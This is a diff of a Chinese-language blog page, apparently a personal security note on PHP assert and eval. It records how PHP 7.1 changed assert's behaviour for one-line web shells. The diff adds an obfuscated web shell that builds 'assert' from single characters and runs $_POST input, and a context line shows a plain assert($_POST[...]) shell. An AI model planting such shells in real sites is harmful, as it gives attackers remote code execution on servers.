@@ -18,7 +18,7 @@
 <meta property="og:locale" content="en">
 <meta property="og:image" content="https://i.loli.net/2020/05/25/yo21sSPejXaEtiw.png">
 <meta property="og:image" content="https://i.loli.net/2020/05/25/btH3lWf4FQDpTLv.png">
-<meta property="og:updated_time" content="2020-05-24T16:14:35.110Z">
+<meta property="og:updated_time" content="2020-05-24T16:19:46.893Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="assert&amp;eval">
 <meta name="twitter:description" content="小总结">
@@ -274,7 +274,10 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert($_POST[&quot;xun9er&quot;]);</span><br></pre></td></tr></table></figure>
 
 <p>只有在zend.assertions=1时可以连接。   </p>
-<h1 id="php7-1以及它之后"><a href="#php7-1以及它之后" class="headerlink" title="php7.1以及它之后"></a>php7.1以及它之后</h1><p>assert作为语言结构，不能再动态的去执行。<br>此外，散装的assert依然可以执行参数中的表达式，但散装的asssert一句话就连不上了。（亲测）<br>php7.1<br><img src="https://i.loli.net/2020/05/25/yo21sSPejXaEtiw.png" alt="批注 2020-05-24 234927.png">  </p>
+<h1 id="php7-1以及它之后"><a href="#php7-1以及它之后" class="headerlink" title="php7.1以及它之后"></a>php7.1以及它之后</h1><p>assert作为语言结构，不能再动态的去执行。<br>此外，散装的assert依然可以执行参数中的表达式，但散装的asssert一句话就连不上了。（亲测）<br>php7.1  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=&apos;a&apos;;</span><br><span class="line">$b=&apos;s&apos;;</span><br><span class="line">$c=&apos;e&apos;;</span><br><span class="line">$d=&apos;r&apos;;</span><br><span class="line">$e=&apos;t&apos;;</span><br><span class="line">$x=$a.$b.$b.$c.$d.$e;</span><br><span class="line">$x($_POST[&quot;xun9er&quot;]);</span><br><span class="line">$x(eval(&quot;echo 1;&quot;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/05/25/yo21sSPejXaEtiw.png" alt="批注 2020-05-24 234927.png">  </p>
 <p><img src="https://i.loli.net/2020/05/25/btH3lWf4FQDpTLv.png" alt="批注 2020-05-24 234912.png">  </p>
 
       
